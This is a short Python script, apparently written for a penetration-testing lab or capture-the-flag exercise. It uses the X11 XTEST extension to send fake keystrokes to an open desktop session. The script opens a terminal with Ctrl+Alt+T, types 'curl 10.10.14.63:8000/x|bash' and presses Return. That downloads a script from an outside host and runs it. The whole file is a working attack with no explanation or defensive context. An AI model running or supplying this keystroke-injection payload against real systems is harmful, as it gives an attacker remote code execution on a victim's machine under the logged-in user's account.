from Xlib import display, X
from Xlib.ext import xtest
from Xlib.XK import string_to_keysym
import time
d = display.Display(':0')
def kc(n): return d.keysym_to_keycode(string_to_keysym(n))
# open xterm via Ctrl+Alt+T
ctrl, alt, t = kc('Control_L'), kc('Alt_L'), kc('t')
for k in (ctrl, alt, t): xtest.fake_input(d, X.KeyPress, k); d.sync(); time.sleep(0.03)
for k in (t, alt, ctrl): xtest.fake_input(d, X.KeyRelease, k); d.sync(); time.sleep(0.03)
d.sync(); time.sleep(2)
NAMES={' ':'space','.':'period',':':'colon','/':'slash','|':'bar','-':'minus',
'0':'0','1':'1','2':'2','3':'3','4':'4','5':'5','6':'6','7':'7','8':'8','9':'9'}
SHIFT=set('|:')
def typ(s):
    for ch in s:
        code=kc(NAMES.get(ch,ch))
        if code==0: continue
        sh=ch.isupper() or ch in SHIFT
        if sh: s2=kc('Shift_L'); xtest.fake_input(d,X.KeyPress,s2)
        xtest.fake_input(d,X.KeyPress,code); xtest.fake_input(d,X.KeyRelease,code)
        if sh: xtest.fake_input(d,X.KeyRelease,s2)
        d.sync(); time.sleep(0.04)
typ('curl 10.10.14.63:8000/x|bash')
r=kc('Return'); xtest.fake_input(d,X.KeyPress,r); xtest.fake_input(d,X.KeyRelease,r);
